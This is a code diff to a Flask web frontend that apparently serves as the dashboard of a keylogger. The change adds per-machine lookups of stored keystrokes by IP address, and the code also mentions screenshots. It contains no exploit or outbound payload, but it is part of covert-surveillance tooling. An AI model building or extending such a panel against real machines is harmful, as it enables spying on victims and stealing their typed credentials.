@@ -7,7 +7,7 @@ from flask import render_template, request, abort, jsonify
 
 # route functions flagged as unused, disabling warning for this function.
 # pylint: disable=W0612
-def init(app):
+def init(app, database):
     """ Add the Frontend views to the app. """
     @app.route('/')
     def index():
@@ -29,6 +29,7 @@ def init(app):
             {
                 type: "text" or "shot" or "ip"
                 since: timestamp # Get all of type since this time. Return all IPs.
+                addr: IP address of the machine we want data about.
             }
             return all (type)s that have a timestamp later than (since)
             in the form of an array of strings.
@@ -46,12 +47,15 @@ def init(app):
         if not 'since' in json:
             print("data request did not include a since")
             abort(400)
+        if not 'addr' in json:
+            print("data request did not include an ip address.")
+            abort(400)
         if json['type'] == 'text':
-            return jsonify(get_text(json['since']))
-        if json['type'] == 'shot':
+            return jsonify(get_text(json['since'], json['addr'], database))
+        """if json['type'] == 'shot':
             return jsonify(get_shots(json['since']))
         if json['type'] == 'ip':
-            return jsonify(get_ips())
+            return jsonify(get_ips())"""
         abort(400)
         return None # God Fucking Damn You PEP8
 
@@ -64,10 +68,13 @@ def validate_ip(_addr):
     """Tell if an IP is a valid IP."""
     return True
 
-def get_text(_since):
+def get_text(_since, addr, database):
     """Get text later than since from the db"""
-
-    return ['never', 'gonna', 'give', 'you', 'up']
+    raw = database.get_keystrokes(addr)
+    parsed = []
+    for entry in raw:
+        parsed.append(entry[1])
+    return parsed
 
 def get_shots(_since):
     """Get screenshots later than since"""
